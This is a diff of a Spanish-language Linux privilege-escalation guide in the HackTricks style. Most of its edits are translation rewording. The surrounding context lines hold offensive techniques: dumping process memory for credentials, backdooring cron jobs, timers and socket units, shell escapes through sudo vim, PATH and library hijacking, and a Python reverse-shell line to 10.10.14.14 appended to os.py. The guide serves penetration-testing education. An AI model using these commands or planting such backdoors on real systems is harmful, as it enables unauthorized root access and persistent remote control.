@@ -6,7 +6,7 @@
 
 ### Información del SO
 
-Comencemos a obtener algo de conocimiento sobre el SO en ejecución
+Comencemos a obtener información sobre el SO en ejecución
 ```bash
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null # old, not by default on many systems
@@ -14,7 +14,7 @@ cat /etc/os-release 2>/dev/null # universal on modern systems
 ```
 ### Ruta
 
-Si **tienes permisos de escritura en alguna carpeta dentro de la variable `PATH`** podrías ser capaz de secuestrar algunas bibliotecas o binarios:
+Si **tienes permisos de escritura en alguna carpeta dentro de la variable `PATH`** es posible que puedas secuestrar algunas bibliotecas o binarios:
 ```bash
 echo $PATH
 ```
@@ -35,7 +35,7 @@ searchsploit "Linux Kernel"
 Puedes encontrar una buena lista de núcleos vulnerables y algunos **exploits compilados** aquí: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) y [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
 Otros sitios donde puedes encontrar algunos **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)
 
-Para extraer todas las versiones vulnerables del núcleo de esa web, puedes hacer:
+Para extraer todas las versiones de núcleo vulnerables de esa web, puedes hacer:
 ```bash
 curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
 ```
@@ -202,7 +202,7 @@ gdb -p <FTP_PROCESS_PID>
 (gdb) q
 strings /tmp/mem_ftp #User and password
 ```
-#### Script de GDB
+#### GDB Script
 ```bash:dump-memory.sh
 #!/bin/bash
 #./dump-memory.sh <PID>
@@ -266,7 +266,7 @@ Press Ctrl-C to end monitoring without terminating the process.
 ```
 ### Herramientas
 
-Para volcar la memoria de un proceso, podrías usar:
+Para volcar la memoria de un proceso, puedes usar:
 
 - [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
 - [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puedes eliminar manualmente los requisitos de root y volcar el proceso que te pertenece
@@ -297,7 +297,7 @@ La herramienta [**https://github.com/huntergregal/mimipenguin**](https://github.
 | LightDM (Ubuntu Desktop)                           | lightdm              |
 | VSFTPd (Conexiones FTP Activas)                    | vsftpd               |
 | Apache2 (Sesiones Activas de Autenticación HTTP Básica) | apache2              |
-| OpenSSH (Sesiones SSH Activas - Uso de Sudo)       | sshd:                |
+| OpenSSH (Sesiones SSH Activas - Uso de Sudo)      | sshd:                |
 
 #### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
 ```bash
@@ -344,11 +344,12 @@ rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh mys
 
 Lee la siguiente página para más trucos de explotación de comodines:
 
+
 {{#ref}}
 wildcards-spare-tricks.md
 {{#endref}}
 
-### Sobrescritura de script de cron y symlink
+### Sobrescritura de script de Cron y symlink
 
 Si **puedes modificar un script de cron** ejecutado por root, puedes obtener un shell muy fácilmente:
 ```bash
@@ -405,7 +406,7 @@ Luego, crea un **ejecutable** con el **mismo nombre que la ruta relativa del bin
 
 ## **Temporizadores**
 
-Los **Temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos o eventos `**.service**`. Los **Temporizadores** se pueden usar como una alternativa a cron, ya que tienen soporte incorporado para eventos de tiempo calendario y eventos de tiempo monótono y se pueden ejecutar de forma asíncrona.
+Los **Temporizadores** son archivos de unidad de systemd cuyo nombre termina en `**.timer**` que controlan archivos o eventos de `**.service**`. Los **Temporizadores** se pueden usar como una alternativa a cron, ya que tienen soporte incorporado para eventos de tiempo calendario y eventos de tiempo monótono y se pueden ejecutar de forma asíncrona.
 
 Puedes enumerar todos los temporizadores con:
 ```bash
@@ -417,9 +418,9 @@ Si puedes modificar un temporizador, puedes hacer que ejecute algunas instancias
 ```bash
 Unit=backdoor.service
 ```
-En la documentación puedes leer qué es la Unidad:
+En la documentación puedes leer qué es la unidad:
 
-> La unidad que se activa cuando se agota este temporizador. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor predeterminado es un servicio que tiene el mismo nombre que la unidad del temporizador, excepto por el sufijo. (Ver arriba.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador tengan nombres idénticos, excepto por el sufijo.
+> La unidad que se activa cuando se agota este temporizador. El argumento es un nombre de unidad, cuyo sufijo no es ".timer". Si no se especifica, este valor predeterminado es un servicio que tiene el mismo nombre que la unidad del temporizador, excepto por el sufijo. (Ver arriba.) Se recomienda que el nombre de la unidad que se activa y el nombre de la unidad del temporizador tengan el mismo nombre, excepto por el sufijo.
 
 Por lo tanto, para abusar de este permiso necesitarías:
 
@@ -435,7 +436,7 @@ Para habilitar un temporizador necesitas privilegios de root y ejecutar:
 sudo systemctl enable backu2.timer
 Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
 ```
-Note que el **temporizador** se **activa** creando un symlink a él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
+Note que el **temporizador** está **activado** al crear un symlink a él en `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`
 
 ## Sockets
 
@@ -453,8 +454,8 @@ Los sockets se pueden configurar utilizando archivos `.socket`.
 
 ### Archivos .socket escribibles
 
-Si encuentras un archivo `.socket` **escribible**, puedes **agregar** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y la puerta trasera se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina se reinicie.**\
-_Ten en cuenta que el sistema debe estar utilizando esa configuración de archivo de socket o la puerta trasera no se ejecutará_
+Si encuentras un archivo `.socket` **escribible**, puedes **agregar** al principio de la sección `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` y el backdoor se ejecutará antes de que se cree el socket. Por lo tanto, **probablemente necesitarás esperar hasta que la máquina se reinicie.**\
+_Ten en cuenta que el sistema debe estar utilizando esa configuración de archivo de socket o el backdoor no se ejecutará_
 
 ### Sockets escribibles
 
@@ -474,6 +475,7 @@ nc -uU /tmp/socket #Connect to UNIX-domain datagram socket
 socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
 ```
 **Ejemplo de explotación:**
+
 
 {{#ref}}
 socket-command-injection.md
@@ -564,11 +566,11 @@ runc-privilege-escalation.md
 
 D-Bus es un sofisticado **sistema de Comunicación entre Procesos (IPC)** que permite a las aplicaciones interactuar y compartir datos de manera eficiente. Diseñado con el sistema Linux moderno en mente, ofrece un marco robusto para diferentes formas de comunicación entre aplicaciones.
 
-El sistema es versátil, soportando IPC básico que mejora el intercambio de datos entre procesos, reminiscentes de **sockets de dominio UNIX mejorados**. Además, ayuda a transmitir eventos o señales, fomentando una integración fluida entre los componentes del sistema. Por ejemplo, una señal de un demonio Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Además, D-Bus soporta un sistema de objetos remotos, simplificando las solicitudes de servicio y las invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.
+El sistema es versátil, soportando IPC básico que mejora el intercambio de datos entre procesos, reminiscentes de **sockets de dominio UNIX mejorados**. Además, ayuda a transmitir eventos o señales, fomentando una integración fluida entre los componentes del sistema. Por ejemplo, una señal de un demonio Bluetooth sobre una llamada entrante puede hacer que un reproductor de música se silencie, mejorando la experiencia del usuario. Adicionalmente, D-Bus soporta un sistema de objetos remotos, simplificando solicitudes de servicio e invocaciones de métodos entre aplicaciones, agilizando procesos que tradicionalmente eran complejos.
 
-D-Bus opera bajo un **modelo de permitir/denegar**, gestionando los permisos de mensajes (llamadas a métodos, emisiones de señales, etc.) basados en el efecto acumulativo de las reglas de política coincidentes. Estas políticas especifican interacciones con el bus, permitiendo potencialmente la escalación de privilegios a través de la explotación de estos permisos.
+D-Bus opera bajo un **modelo de permitir/negar**, gestionando permisos de mensajes (llamadas a métodos, emisiones de señales, etc.) basados en el efecto acumulativo de las reglas de política que coinciden. Estas políticas especifican interacciones con el bus, permitiendo potencialmente la escalación de privilegios a través de la explotación de estos permisos.
 
-Se proporciona un ejemplo de tal política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, detallando los permisos para que el usuario root posea, envíe y reciba mensajes de `fi.w1.wpa_supplicant1`.
+Se proporciona un ejemplo de tal política en `/etc/dbus-1/system.d/wpa_supplicant.conf`, detallando permisos para que el usuario root posea, envíe y reciba mensajes de `fi.w1.wpa_supplicant1`.
 
 Las políticas sin un usuario o grupo especificado se aplican universalmente, mientras que las políticas de contexto "predeterminadas" se aplican a todos los que no están cubiertos por otras políticas específicas.
 ```xml
@@ -581,13 +583,14 @@ Las políticas sin un usuario o grupo especificado se aplican universalmente, mi
 ```
 **Aprende a enumerar y explotar una comunicación D-Bus aquí:**
 
+
 {{#ref}}
 d-bus-enumeration-and-command-injection-privilege-escalation.md
 {{#endref}}
 
 ## **Red**
 
-Siempre es interesante enumerar la red y determinar la posición de la máquina.
+Siempre es interesante enumerar la red y averiguar la posición de la máquina.
 
 ### Enumeración genérica
 ```bash
@@ -621,7 +624,7 @@ Siempre verifica los servicios de red que se están ejecutando en la máquina co
 ```
 ### Sniffing
 
-Verifica si puedes esnifar tráfico. Si puedes, podrías ser capaz de obtener algunas credenciales.
+Verifica si puedes esnifar tráfico. Si puedes, podrías ser capaz de capturar algunas credenciales.
 ```
 timeout 1 tcpdump
 ```
@@ -660,6 +663,7 @@ Algunas versiones de Linux fueron afectadas por un error que permite a los usuar
 
 Verifica si eres **miembro de algún grupo** que podría otorgarte privilegios de root:
 
+
 {{#ref}}
 interesting-groups-linux-pe/
 {{#endref}}
@@ -683,7 +687,7 @@ grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/logi
 ```
 ### Conocidas contraseñas
 
-Si **conoces alguna contraseña** del entorno, **intenta iniciar sesión como cada usuario** usando la contraseña.
+Si **conoces alguna contraseña** del entorno **intenta iniciar sesión como cada usuario** usando la contraseña.
 
 ### Su Brute
 
@@ -694,7 +698,7 @@ Si no te importa hacer mucho ruido y los binarios `su` y `timeout` están presen
 
 ### $PATH
 
-Si encuentras que puedes **escribir dentro de alguna carpeta del $PATH**, podrías ser capaz de escalar privilegios **creando una puerta trasera dentro de la carpeta escribible** con el nombre de algún comando que va a ser ejecutado por un usuario diferente (idealmente root) y que **no se carga desde una carpeta que esté ubicada antes** de tu carpeta escribible en $PATH.
+Si encuentras que puedes **escribir dentro de alguna carpeta del $PATH** podrías ser capaz de escalar privilegios **creando una puerta trasera dentro de la carpeta escribible** con el nombre de algún comando que va a ser ejecutado por un usuario diferente (idealmente root) y que **no se carga desde una carpeta que esté ubicada antes** de tu carpeta escribible en $PATH.
 
 ### SUDO y SUID
 
@@ -714,13 +718,13 @@ less>! <shell_comand>
 ```
 ### NOPASSWD
 
-La configuración de Sudo puede permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin conocer la contraseña.
+La configuración de Sudo podría permitir a un usuario ejecutar algún comando con los privilegios de otro usuario sin conocer la contraseña.
 ```
 $ sudo -l
 User demo may run the following commands on crashlab:
 (root) NOPASSWD: /usr/bin/vim
 ```
-En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`, ahora es trivial obtener un shell al agregar una clave ssh en el directorio raíz o al llamar a `sh`.
+En este ejemplo, el usuario `demo` puede ejecutar `vim` como `root`, ahora es trivial obtener un shell añadiendo una clave ssh en el directorio raíz o llamando a `sh`.
 ```
 sudo vim -c '!sh'
 ```
@@ -763,13 +767,13 @@ export PATH=/tmp:$PATH
 #Put your backdoor in /tmp and name it "less"
 sudo less
 ```
-Esta técnica también se puede utilizar si un **suid** binario **ejecuta otro comando sin especificar la ruta a este (siempre verifica con** _**strings**_ **el contenido de un binario SUID extraño)**.
+Esta técnica también se puede utilizar si un **suid** binario **ejecuta otro comando sin especificar la ruta a él (siempre verifica con** _**strings**_ **el contenido de un binario SUID extraño)**.
 
 [Ejemplos de payloads para ejecutar.](payloads-to-execute.md)
 
 ### Binario SUID con ruta de comando
 
-Si el **suid** binario **ejecuta otro comando especificando la ruta**, entonces, puedes intentar **exportar una función** nombrada como el comando que el archivo suid está llamando.
+Si el **suid** binario **ejecuta otro comando especificando la ruta**, entonces, puedes intentar **exportar una función** llamada como el comando que el archivo suid está llamando.
 
 Por ejemplo, si un binario suid llama a _**/usr/sbin/service apache2 start**_ tienes que intentar crear la función y exportarla:
 ```bash
@@ -782,7 +786,7 @@ Entonces, cuando llamas al binario suid, esta función se ejecutará
 
 La variable de entorno **LD_PRELOAD** se utiliza para especificar una o más bibliotecas compartidas (.so files) que deben ser cargadas por el cargador antes que todas las demás, incluida la biblioteca estándar de C (`libc.so`). Este proceso se conoce como precarga de una biblioteca.
 
-Sin embargo, para mantener la seguridad del sistema y prevenir que esta característica sea explotada, particularmente con ejecutables **suid/sgid**, el sistema impone ciertas condiciones:
+Sin embargo, para mantener la seguridad del sistema y prevenir que esta función sea explotada, particularmente con ejecutables **suid/sgid**, el sistema impone ciertas condiciones:
 
 - El cargador ignora **LD_PRELOAD** para ejecutables donde el ID de usuario real (_ruid_) no coincide con el ID de usuario efectivo (_euid_).
 - Para ejecutables con suid/sgid, solo se precargan bibliotecas en rutas estándar que también son suid/sgid.
@@ -871,7 +875,7 @@ something.so => /lib/x86_64-linux-gnu/something.so
 readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
-Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta donde podemos escribir, creemos la biblioteca en esa carpeta con el nombre necesario:
+Ahora que hemos encontrado un binario SUID que carga una biblioteca desde una carpeta donde podemos escribir, vamos a crear la biblioteca en esa carpeta con el nombre necesario:
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
 #include <stdio.h>
@@ -901,9 +905,11 @@ El proyecto recopila funciones legítimas de binarios de Unix que pueden ser abu
 > strace -o /dev/null /bin/sh\
 > sudo awk 'BEGIN {system("/bin/sh")}'
 
+
 {{#ref}}
 https://gtfobins.github.io/
 {{#endref}}
+
 
 {{#ref}}
 https://gtfoargs.github.io/
@@ -954,7 +960,7 @@ Por ejemplo, si puedes sobrescribir el archivo _/var/run/sudo/ts/sampleuser_ y t
 ### /etc/sudoers, /etc/sudoers.d
 
 El archivo `/etc/sudoers` y los archivos dentro de `/etc/sudoers.d` configuran quién puede usar `sudo` y cómo. Estos archivos **por defecto solo pueden ser leídos por el usuario root y el grupo root**.\
-**Si** puedes **leer** este archivo, podrías **obtener información interesante**, y si puedes **escribir** en cualquier archivo, podrás **escalar privilegios**.
+**Si** puedes **leer** este archivo, podrías ser capaz de **obtener información interesante**, y si puedes **escribir** cualquier archivo, podrás **escalar privilegios**.
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
@@ -1008,6 +1014,7 @@ Eso significa que se leerán los archivos de configuración de `/etc/ld.so.conf.
 
 Si por alguna razón **un usuario tiene permisos de escritura** en cualquiera de las rutas indicadas: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, cualquier archivo dentro de `/etc/ld.so.conf.d/` o cualquier carpeta dentro del archivo de configuración en `/etc/ld.so.conf.d/*.conf`, puede ser capaz de escalar privilegios.\
 Echa un vistazo a **cómo explotar esta mala configuración** en la siguiente página:
+
 
 {{#ref}}
 ld.so.conf-example.md
@@ -1078,7 +1085,7 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ## Abrir sesiones de shell
 
 En **versiones antiguas** puedes **secuestrar** algunas sesiones de **shell** de un usuario diferente (**root**).\
-En **versiones más recientes** solo podrás **conectarte** a las sesiones de pantalla de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.
+En **versiones más recientes** solo podrás **conectarte** a sesiones de pantalla de **tu propio usuario**. Sin embargo, podrías encontrar **información interesante dentro de la sesión**.
 
 ### Secuestro de sesiones de pantalla
 
@@ -1136,10 +1143,10 @@ Este error se produce al crear una nueva clave ssh en esos sistemas operativos, 
 
 Especifica si el root puede iniciar sesión usando ssh, el valor predeterminado es `no`. Valores posibles:
 
-- `yes`: el root puede iniciar sesión usando contraseña y clave privada
-- `without-password` o `prohibit-password`: el root solo puede iniciar sesión con una clave privada
-- `forced-commands-only`: el root solo puede iniciar sesión usando clave privada y si se especifican las opciones de comandos
-- `no`: no
+- `yes`: root puede iniciar sesión usando contraseña y clave privada
+- `without-password` o `prohibit-password`: root solo puede iniciar sesión con una clave privada
+- `forced-commands-only`: Root solo puede iniciar sesión usando clave privada y si se especifican las opciones de comandos
+- `no` : no
 
 ### AuthorizedKeysFile
 
@@ -1151,7 +1158,7 @@ Esa configuración indicará que si intentas iniciar sesión con la **clave priv
 
 ### ForwardAgent/AllowAgentForwarding
 
-El reenvío del agente SSH te permite **usar tus claves SSH locales en lugar de dejar claves** (¡sin frases de contraseña!) en tu servidor. Así, podrás **saltar** a través de ssh **a un host** y desde allí **saltar a otro** host **usando** la **clave** ubicada en tu **host inicial**.
+El reenvío de agente SSH te permite **usar tus claves SSH locales en lugar de dejar claves** (¡sin frases de contraseña!) en tu servidor. Así, podrás **saltar** a través de ssh **a un host** y desde allí **saltar a otro** host **usando** la **clave** ubicada en tu **host inicial**.
 
 Necesitas establecer esta opción en `$HOME/.ssh.config` así:
 ```
@@ -1160,7 +1167,7 @@ ForwardAgent yes
 ```
 Nota que si `Host` es `*`, cada vez que el usuario salta a una máquina diferente, ese host podrá acceder a las claves (lo cual es un problema de seguridad).
 
-El archivo `/etc/ssh_config` puede **sobrescribir** estas **opciones** y permitir o denegar esta configuración.\
+El archivo `/etc/ssh_config` puede **anular** estas **opciones** y permitir o denegar esta configuración.\
 El archivo `/etc/sshd_config` puede **permitir** o **denegar** el reenvío de ssh-agent con la palabra clave `AllowAgentForwarding` (el valor predeterminado es permitir).
 
 Si encuentras que el Forward Agent está configurado en un entorno, lee la siguiente página ya que **puedes abusar de ello para escalar privilegios**:
@@ -1177,11 +1184,11 @@ El archivo `/etc/profile` y los archivos bajo `/etc/profile.d/` son **scripts qu
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
-Si se encuentra algún script de perfil extraño, debe revisarlo en busca de **detalles sensibles**.
+Si se encuentra algún script de perfil extraño, debes revisarlo en busca de **detalles sensibles**.
 
 ### Archivos Passwd/Shadow
 
-Dependiendo del sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` pueden tener un nombre diferente o puede haber una copia de seguridad. Por lo tanto, se recomienda **encontrar todos ellos** y **verificar si puede leer** los archivos para ver **si hay hashes** dentro de los archivos:
+Dependiendo del sistema operativo, los archivos `/etc/passwd` y `/etc/shadow` pueden tener un nombre diferente o puede haber una copia de seguridad. Por lo tanto, se recomienda **encontrar todos ellos** y **verificar si puedes leer** los archivos para ver **si hay hashes** dentro de los archivos:
 ```bash
 #Passwd equivalent files
 cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
@@ -1221,7 +1228,7 @@ Deberías verificar si puedes **escribir en algunos archivos sensibles**. Por ej
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
 ```
-Por ejemplo, si la máquina está ejecutando un **servidor tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
+Por ejemplo, si la máquina está ejecutando un **tomcat** server y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:
 ```
 ExecStart=/path/to/backdoor
 User=root
@@ -1321,7 +1328,7 @@ No voy a listar aquí cómo hacer todo esto, pero si estás interesado, puedes r
 
 Si sabes de **dónde** se va a ejecutar un script de python y **puedes escribir dentro** de esa carpeta o **modificar bibliotecas de python**, puedes modificar la biblioteca OS y ponerle un backdoor (si puedes escribir donde se va a ejecutar el script de python, copia y pega la biblioteca os.py).
 
-Para **poner un backdoor en la biblioteca**, simplemente agrega al final de la biblioteca os.py la siguiente línea (cambia IP y PUERTO):
+Para **poner un backdoor en la biblioteca**, simplemente añade al final de la biblioteca os.py la siguiente línea (cambia IP y PUERTO):
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
@@ -1356,9 +1363,9 @@ DEVICE=eth0
 ```
 ### **init, init.d, systemd y rc.d**
 
-El directorio `/etc/init.d` es el hogar de **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y a veces `reload` servicios. Estos pueden ejecutarse directamente o a través de enlaces simbólicos encontrados en `/etc/rc?.d/`. Un camino alternativo en sistemas Redhat es `/etc/rc.d/init.d`.
+El directorio `/etc/init.d` es el hogar de **scripts** para System V init (SysVinit), el **sistema clásico de gestión de servicios de Linux**. Incluye scripts para `iniciar`, `detener`, `reiniciar` y a veces `recargar` servicios. Estos pueden ejecutarse directamente o a través de enlaces simbólicos encontrados en `/etc/rc?.d/`. Un camino alternativo en sistemas Redhat es `/etc/rc.d/init.d`.
 
-Por otro lado, `/etc/init` está asociado con **Upstart**, un **sistema de gestión de servicios** más nuevo introducido por Ubuntu, que utiliza archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.
+Por otro lado, `/etc/init` está asociado con **Upstart**, una **gestión de servicios** más nueva introducida por Ubuntu, utilizando archivos de configuración para tareas de gestión de servicios. A pesar de la transición a Upstart, los scripts de SysVinit todavía se utilizan junto con las configuraciones de Upstart debido a una capa de compatibilidad en Upstart.
 
 **systemd** surge como un moderno gestor de inicialización y servicios, ofreciendo características avanzadas como el inicio de demonios bajo demanda, gestión de automontaje y instantáneas del estado del sistema. Organiza archivos en `/usr/lib/systemd/` para paquetes de distribución y `/etc/systemd/system/` para modificaciones de administradores, agilizando el proceso de administración del sistema.
 
@@ -1366,17 +1373,20 @@ Por otro lado, `/etc/init` está asociado con **Upstart**, un **sistema de gesti
 
 ### Escalación de privilegios NFS
 
+
 {{#ref}}
 nfs-no_root_squash-misconfiguration-pe.md
 {{#endref}}
 
-### Escapando de Shells restringidos
+### Escape de Shells restringidos
+
 
 {{#ref}}
 escaping-from-limited-bash.md
 {{#endref}}
 
 ### Cisco - vmanage
+
 
 {{#ref}}
 cisco-vmanage.md
@@ -1426,9 +1436,11 @@ cisco-vmanage.md
 - [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 - [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
 
+
 ## Marcos de rooting de Android: abuso de canal de administrador
 
 Los marcos de rooting de Android comúnmente enganchan una syscall para exponer la funcionalidad privilegiada del kernel a un administrador de espacio de usuario. La autenticación débil del administrador (por ejemplo, verificaciones de firma basadas en el orden de FD o esquemas de contraseña deficientes) puede permitir que una aplicación local se haga pasar por el administrador y escale a root en dispositivos ya rooteados. Aprende más y detalles de explotación aquí:
+
 
 {{#ref}}
 android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
